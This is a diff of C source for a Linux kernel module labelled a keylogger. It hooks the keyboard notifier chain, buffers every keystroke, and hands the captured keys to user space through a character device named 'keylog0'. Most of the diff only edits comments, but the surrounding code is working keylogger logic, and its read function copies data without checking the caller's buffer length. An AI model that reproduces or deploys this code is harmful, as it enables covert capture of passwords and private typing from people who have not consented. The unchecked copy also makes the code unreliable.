@@ -1,19 +1,20 @@
+//Kernel notifier keylogger Yonor & Elona
+//
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/keyboard.h>
 #include <linux/fs.h>
 #include <linux/uaccess.h>
 #include <linux/notifier.h>
-//Kernel notifier keylogger Yonor & Elona
-#define DEVICE_NAME "keylog0"  // The Device name for our Device Driver
-static int major;  // The Major Number that will be assigned to our Device Driver
+
+#define DEVICE_NAME "keylog0"  // Name of the device
+static int major;  // Major number for CHARDEV
 
 // Keylogger Info
 #define BUFFER_LEN 1024
 static char keys_buffer[BUFFER_LEN];  // This buffer will contain all the logged keys
-static char *keys_bf_ptr = keys_buffer; 
-// Our buffer will only be of size 1024. If the user typed more that 1024 valid characters, the keys_buf_ptr would overflow
-int buf_pos = 0;  // buf_pos keeps track of the count of characters read to avoid overflows in kernel space
+static char *keys_bf_ptr = keys_buffer; //This buffer holds the characters, it is limit to 1024. Be aware to not Overflow.
+int buf_pos = 0;  // Counting characters to avoid overflow
 
 // Prototypes
 static ssize_t dev_read(struct file *, char __user *, size_t, loff_t *); // Device Driver read prototype
@@ -47,6 +48,7 @@ static int keys_pressed(struct notifier_block *nb, unsigned long action, void *d
 		}
 		
 		// Beware of buffer overflows in kernel space!! They can be catastrophic!
+		//Prevents the OS to cracked in event of OVERFLOW
 		if (buf_pos >= BUFFER_LEN) {
 			buf_pos = 0;
 			memset(keys_buffer, 0, BUFFER_LEN);
@@ -59,12 +61,12 @@ static int keys_pressed(struct notifier_block *nb, unsigned long action, void *d
 // Device driver read function
 static ssize_t dev_read(struct file *fp, char __user *buf, size_t length, loff_t *offset) {
 	int len = strlen(keys_buffer);
-	int ret = copy_to_user(buf, keys_buffer, len);
+	int ret = copy_to_user(buf, keys_buffer, len); //Taking data from Kernel with COPY_TO_USER
 	if (ret) {
 		printk(KERN_INFO "Couldn't copy all data to user space\n");
 		return ret;
 	}
-	memset(keys_buffer, 0, BUFFER_LEN); // Reset buffer after each read
+	memset(keys_buffer, 0, BUFFER_LEN); // Reset buffer after each read this also helps to avoid overflow
 	keys_bf_ptr = keys_buffer; // Reset buffer pointer
 	return len;
 }
